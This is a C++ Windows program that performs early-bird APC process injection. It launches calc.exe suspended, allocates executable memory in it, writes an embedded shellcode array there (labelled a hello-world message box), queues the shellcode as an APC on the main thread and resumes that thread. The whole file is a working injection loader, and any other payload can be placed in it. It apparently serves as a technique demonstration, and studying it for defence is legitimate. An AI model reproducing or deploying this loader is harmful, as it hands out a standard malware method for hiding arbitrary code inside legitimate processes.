#include "pch.h"
#include <Windows.h>
#include <iostream>

int main()
{
	STARTUPINFOA si;
	PROCESS_INFORMATION pi;
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	//helloworld MessageBox
	char shellcode[] = "\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42"
		"\x08\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03"
		"\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b"
		"\x34\xaf\x01\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e"
		"\x08\x45\x78\x69\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c"
		"\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x72\x6c"
		"\x64\x01\x68\x6c\x6f\x57\x6f\x68\x20\x68\x65\x6c\x89\xe1\xfe"
		"\x49\x0b\x31\xc0\x51\x50\xff\xd7";

	int sc_len = sizeof(shellcode);
	VOID CALLBACK APCProc();

	if (!CreateProcessA((LPCSTR)"C:\\Windows\\System32\\calc.exe", (LPSTR)NULL, (LPSECURITY_ATTRIBUTES)NULL, (LPSECURITY_ATTRIBUTES)NULL, (BOOL)FALSE, (DWORD)CREATE_SUSPENDED, (LPVOID)NULL, (LPCSTR)NULL, (LPSTARTUPINFOA)&si, (LPPROCESS_INFORMATION)&pi))
	{
		DWORD err = GetLastError();
		std::cout << "CreatProcess Err: " << err << std::endl;
	}
	else
	{
		LPVOID addr = VirtualAllocEx(pi.hProcess, NULL, sc_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		if (addr == NULL)
		{
			DWORD err = GetLastError();
			std::cout << "VirtualAllocEx Err: " << err << std::endl;
		}
		else
		{
			if (!WriteProcessMemory(pi.hProcess, addr, shellcode, sc_len, NULL))
			{
				DWORD err = GetLastError();
				std::cout << "WriteProcessMemory Err " << err << std::endl;
			}
			else
			{
				PTHREAD_START_ROUTINE pfnAPC = (PTHREAD_START_ROUTINE)addr;
				if (!QueueUserAPC((PAPCFUNC)pfnAPC, pi.hThread, NULL))
				{
					DWORD err = GetLastError();
					std::cout << "QueueUserAPC Err " << err << std::endl;
				}
				else
				{
					ResumeThread(pi.hThread);
				}
			}
		}
	}
	return 0;
}
